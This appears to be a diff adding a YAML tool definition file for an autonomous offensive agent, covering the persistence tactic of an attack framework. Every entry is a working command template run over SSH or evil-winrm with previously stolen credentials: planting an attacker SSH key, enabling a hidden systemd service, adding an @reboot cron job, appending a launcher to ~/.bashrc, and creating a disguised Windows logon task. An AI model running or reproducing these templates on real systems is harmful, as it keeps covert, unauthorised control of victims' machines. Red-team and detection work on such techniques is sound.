@@ -1,0 +1,140 @@
+# Persistence (TA0003): mechanisms to maintain access after the initial
+# foothold. All tools route via sshpass/SSH into the target with credentials
+# the agent previously obtained via Initial Access or Credential Access.
+
+tools:
+  - name: append_authorized_key
+    category: post-exploit
+    description: Add an SSH public key to the target's authorized_keys.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'mkdir -p ~/.ssh && echo {pubkey} >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user with shell access }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: pubkey, type: free_string, description: public-key blob (no spaces; agent must base64 first) }
+    runtime_cap_seconds: 30
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0003]
+      techniques: [T1098.004]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      pubkey: ssh-ed25519-AAAAC3-attacker
+    example_output: ""
+
+  - name: install_systemd_service
+    category: post-exploit
+    description: Drop a systemd unit + enable it for boot-persistence on Linux.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'echo {unit_b64} | base64 -d | sudo tee /etc/systemd/system/{name}.service && sudo systemctl daemon-reload && sudo systemctl enable {name}'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user with sudo }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: name, type: free_string, description: service unit name (no extension) }
+      - { name: unit_b64, type: free_string, description: base64-encoded service-file body }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0003, TA0004]
+      techniques: [T1543.002]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: root
+      password: toor
+      name: sysmonitor
+      unit_b64: W1VuaXRdCkRl=
+    example_output: |
+      Created symlink /etc/systemd/system/multi-user.target.wants/sysmonitor.service.
+
+  - name: cron_job_persistence
+    category: post-exploit
+    description: Add a cron entry that runs a payload on a schedule.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} '(crontab -l 2>/dev/null; echo {schedule} {payload_path}) | crontab -'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - name: schedule
+        type: enum
+        description: cron schedule
+        values: ["@reboot", "*/5 * * * *", "0 * * * *", "0 0 * * *"]
+        default: "@reboot"
+      - { name: payload_path, type: file_path, description: absolute path to payload script }
+    runtime_cap_seconds: 30
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0003]
+      techniques: [T1053.003]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      schedule: "@reboot"
+      payload_path: /tmp/.cache/sync
+    example_output: ""
+
+  - name: bashrc_persistence
+    category: post-exploit
+    description: Append a payload-launcher line to a user's ~/.bashrc.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'echo {launcher} >> ~/.bashrc'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: target user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: launcher, type: free_string, description: bash command to launch on login (escape-free) }
+    runtime_cap_seconds: 15
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0003]
+      techniques: [T1546.004]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      launcher: /tmp/.cache/launch_agent_helper
+    example_output: ""
+
+  - name: schtasks_persistence_windows
+    category: post-exploit
+    description: Create a Windows scheduled task via evil-winrm that runs at logon.
+    command_template: "evil-winrm -i {ip} -u {user} -p {password} -e {evil_dir} -s {scripts_dir} --url-format 'iex {launcher_url}' -c 'schtasks /Create /SC ONLOGON /TN {task_name} /TR {payload_cmd}'"
+    slots:
+      - { name: ip, type: ip, description: Windows target }
+      - { name: user, type: free_string, description: Windows account }
+      - { name: password, type: free_string, description: account password }
+      - { name: evil_dir, type: file_path, description: evil-winrm exes dir }
+      - { name: scripts_dir, type: file_path, description: evil-winrm scripts dir }
+      - { name: launcher_url, type: free_string, description: optional URL for IEX launcher (set to none if unused) }
+      - { name: task_name, type: free_string, description: scheduled task name }
+      - { name: payload_cmd, type: file_path, description: absolute path to payload exe on target }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0003, TA0004]
+      techniques: [T1053.005]
+    example_invocation:
+      ip: 10.10.10.5
+      user: Administrator
+      password: Hunter2
+      evil_dir: /opt/evil-winrm/exes
+      scripts_dir: /opt/evil-winrm/scripts
+      launcher_url: none
+      task_name: WindowsUpdateHelper
+      payload_cmd: C:/ProgramData/wsh.exe
+    example_output: |
+      SUCCESS: The scheduled task "WindowsUpdateHelper" has successfully been created.
